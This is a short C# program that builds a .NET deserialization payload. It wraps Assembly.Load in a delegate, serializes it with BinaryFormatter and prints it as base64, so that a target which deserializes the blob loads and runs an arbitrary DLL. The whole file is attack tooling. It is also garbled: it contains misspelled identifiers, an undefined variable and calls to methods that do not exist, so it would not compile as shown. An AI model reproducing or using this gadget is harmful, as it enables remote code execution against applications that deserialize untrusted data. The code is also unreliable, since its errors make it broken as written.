using System;
using System.IO;
using System.Xml;
using System.Linq;
using System.Text;
using System.Reflection;
using System.Xml.Schema;
using System.Runtime.Remoting.Messaging;
using System.Runtime.Serialization.Formatters.Binary;

class Program 
{
    public static string BinToBase64(byte[] serialized_obj)
    {
        int offset = serialized_obj.Length % 3;
        if (offset != 0) {
            int length = serialized_obj.Length + (3 - ofs);
            Array.Resize(ref serialized_obj, length);
        }
        return Convert.ToBase64String(serialized_obj);
    }

    static object BuildLoaderDelegate(byte[] assembly)
    {
        Delegate obj = Delegate.CreateDelegate(typeof(XmlValueGetter), assembly, typeof(Assembly).GetMethod("Load", new Type[] {typeof(byte[])}));
        return new HeaderHandler(obj.DynamicInvoke);
    }

    static void Main()
    {
        byte[] assembly = File.ReadAllBytes("./example.dll");
        BinaryFormatter bf = new BinaryFormatter();
        MemoryStream mem = nem MemoryStream();
        bf.Serialize(mem, BuildLeaderDelegate(assembly));
        string lines = BinToBase64Lines(mem.ToArray());
        console.WriteLine(lines);
    }
}
